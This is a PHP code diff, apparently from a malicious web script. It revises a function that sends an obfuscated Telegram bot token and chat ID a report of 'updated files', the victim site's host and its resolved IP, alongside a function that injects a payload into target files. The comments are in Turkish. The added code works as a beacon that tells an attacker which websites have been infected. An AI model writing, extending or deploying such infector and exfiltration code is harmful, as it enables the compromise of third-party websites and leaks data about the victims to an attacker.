@@ -62,20 +62,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 
     function sendTelegramNotification($updatedFiles)
-    {
-        $botToken = "\x37\x32\70\70\x35\x33\60\x30\x35\x36\x3a\101\x41\110\x33\x6d\166\x6a\125\x33\167\x6c\x39\64\x41\151\166\106\130\x62\130\62\130\127\110\x34\x4f\165\x67\x36\x63\x37\64\x67\171\x38";
-        $chatId = "\55\61\x30\x30\62\x34\62\67\x33\70\67\70\63\70";
+{
+    $botToken = "\x37\x32\70\x38\x35\x33\60\x30\x35\x36\x3a\101\x41\110\x33\x6d\166\x6a\125\x33\167\x6c\x39\64\x41\151\166\106\130\x62\130\62\130\127\110\x34\x4f\165\x67\x36\x63\x37\64\x67\171\x38";
+    $chatId = "\55\61\x30\x30\x32\x34\62\67\x33\70\67\70\63\70";
 
-        $message = "Güncellenen dosyalar:\n";
-        foreach ($updatedFiles as $filePath) {
-            $message .= "- $filePath\n";
-        }
-        $message .= "Sayfa URL: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    $processedPaths = [];
 
-        $message = urlencode($message);
-
-        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
+    foreach ($updatedFiles as $filePath) {
+        // Domain ile / arasına bir boşluk ekle
+        $formattedPath = preg_replace('/(\.[a-z]{2,})(\/)/', '$1 $2', $filePath);
+        $processedPaths[] = $formattedPath; // İşlenmiş yolu diziye ekle
     }
+
+    // Tekrar eden yolları filtrele
+    $uniquePaths = array_unique($processedPaths);
+
+    $message = "Güncellenen dosyalar:\n";
+    foreach ($uniquePaths as $uniquePath) {
+        $message .= "- $uniquePath\n";
+    }
+
+    $host = $_SERVER['HTTP_HOST'];  // Doğrudan host değerini alıyoruz
+    $message .= "Sayfa URL: " . $host . "\n";
+
+    // DNS sorgusu ile IP adresini alıyoruz
+    $dnsRecords = dns_get_record($host, DNS_A);
+    $ip = isset($dnsRecords[0]['ip']) ? $dnsRecords[0]['ip'] : 'IP bulunamadı';
+
+    $message .= "Sayfaya Ait Domain ip si: " . $ip . "\n";
+
+    // Telegram mesajını gönder
+    $message = urlencode($message);
+    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
+}
+
 
     function scanAndProcess($directory, $payload, $targetFiles, &$updatedFiles)
     {
